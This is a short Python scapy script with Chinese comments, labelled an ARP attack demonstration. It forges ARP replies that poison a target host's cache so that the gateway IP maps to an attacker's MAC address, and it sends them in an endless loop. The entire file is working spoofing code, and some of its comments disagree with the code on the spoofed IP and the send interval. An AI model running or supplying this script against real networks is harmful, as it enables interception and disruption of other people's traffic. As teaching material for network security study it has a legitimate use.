#!/usr/bin/python3
# -*- coding: utf-8 -*-
# ARP攻击演示脚本/arpDemo.py


import scapy

from scapy.all import (Ether,ARP,sendp
)

# 注意这里面的几个方法
# Ether用来构建以太网数据包
# ARP是构建ARP数据包的类
# sendp方法在第二层发送数据包

# Ether用来构建以太网数据包
eth = Ether()
arp = ARP(
    # 代表ARP请求或者响应
    op="is-at",

    # 发送方Mac地址/毒化记录中的MAC
    hwsrc="08:00:27:97:d1:f5",
    # 发送方IP地址/毒化记录中的IP
    psrc="192.168.31.1",

    # 目标Mac地址/被欺骗主机MAC
    hwdst="2C:56:DC:D3:AB:DB",
    # 目标IP地址/被欺骗主机IP地址
    pdst="192.168.31.248"

    # 意思就是告诉192.168.31.248这个地址的主机，IP为192.168.31.100的主机MAC地址是08:00:27:97:d1:f5
    # 如果不写目标主机的IP和MAC则默认以广播的形式发送
)
# scapy重载了"/"操作符，可以用来表示两个协议层的组合
# 这里我们输出一下数据包的结构信息
print((eth / arp).show())

# 发送封包，并且每间隔1秒重复发送
sendp(eth / arp, inter=2, loop=1)
